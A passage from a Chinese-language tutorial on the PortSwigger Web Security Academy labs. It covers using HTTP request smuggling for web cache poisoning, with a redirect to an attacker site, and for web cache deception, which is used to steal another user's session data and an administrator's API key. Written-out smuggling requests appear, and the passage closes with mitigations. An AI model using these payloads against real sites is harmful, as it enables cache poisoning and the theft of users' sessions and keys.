Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/

```

当其他用户请求此 URL 时，他们会收到指向攻击者网站的重定向。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8F%91%E5%8A%A8web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"></a>配套靶场：利用HTTP请求走私发动web缓存投毒

首先我们利用重定向原理观察一下是怎么构造的

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t019346f9bac690ec00.png">](https://p5.ssl.qhimg.com/t019346f9bac690ec00.png)

然后我们就可以在Exploit Server中构造如下payload并修改请求包

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t0189f08b99c04a0def.png">](https://p5.ssl.qhimg.com/t0189f08b99c04a0def.png)

[<img class="aligncenter" alt="" data-original="https://p1.ssl.qhimg.com/t013114e1212b9ee603.png">](https://p1.ssl.qhimg.com/t013114e1212b9ee603.png)

于是我们再夹带一个请求包以使几乎所有页面都会被缓存，从而实现全范围的投毒

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01e2afeb86437176fa.png">](https://p3.ssl.qhimg.com/t01e2afeb86437176fa.png)

多点击几次即可缓存所有页面，因为所有页面都被投毒，导致用户的受到严重影响，所以危害还是很大的

[<img class="aligncenter" alt="" data-original="https://p3.ssl.qhimg.com/t01604f34bb2877625d.png">](https://p3.ssl.qhimg.com/t01604f34bb2877625d.png)

### <a class="reference-link" name="%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8F%91%E5%8A%A8Web%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"></a>利用HTTP请求走私发动Web缓存欺骗

Web缓存欺骗是将其他用户接收到的响应作为缓存，从而在缓存有效期内攻击者也能访问到该缓存中包含的敏感信息，这一点是与Web缓存投毒不同的。我们尝试这样构造攻击

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X

```

转发到后端服务器的另一个用户的下一个请求将附加到走私请求，包括会话cookie和其他头

```
GET /private/messages HTTP/1.1
Foo: XGET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com
Cookie: sessionId=q1jn30m6mqa7nbwsa0bhmbr7ln2vmh7z
...
```

服务器会缓存/static/some-image.png的响应，攻击者也能接收到这份缓存

```
GET /static/some-image.png HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 200 Ok
...
&lt;h1&gt;Your private messages&lt;/h1&gt;
...

```

但是这种攻击需要大量的请求才可能成功，因为不知道哪个URL会产生敏感信息。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%8F%91%E5%8A%A8Web%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"></a>配套靶场：利用HTTP请求走私发动Web缓存欺骗

先登录测试用户，然后知道了/account页面可以看到用户的API Key，所以我们可以这样构造payload

[<img class="aligncenter" alt="" data-original="https://p0.ssl.qhimg.com/t0198c633c170c55e2a.png">](https://p0.ssl.qhimg.com/t0198c633c170c55e2a.png)

不断地重放包，然后得到以上响应以后要在隐私模式下访问首页，多刷新几次刷到加载出首页以后，点开burp中的Search功能，搜索Your API Key is直到出现以下情况

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t017f4aef5585d161b5.png">](https://p5.ssl.qhimg.com/t017f4aef5585d161b5.png)

我们就得到了administrator的API Key了

[<img class="aligncenter" alt="" data-original="https://p5.ssl.qhimg.com/t01dadf5b126d9c7deb.png">](https://p5.ssl.qhimg.com/t01dadf5b126d9c7deb.png)



## 如何缓解HTTP请求走私漏洞？
- 禁用后端连接的重用，防止多个请求拼接
- 使用HTTP/2用于后端连接，该协议可以防止请求之间的界限模糊不清
- 前后端使用完全相同的中间件，以保证对请求处理方式的一致性


## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之高级漏洞篇 – HTTP请求走私专题的全部内容啦，本专题主要讲了HTTP请求走私攻击的原理、识别方法、构造方法、利用及防护等，本专题还是非常有趣的，大家一定要动手开启靶场亲自做一遍哦，感兴趣的同学可以在评论区进行讨论，嘻嘻嘻。
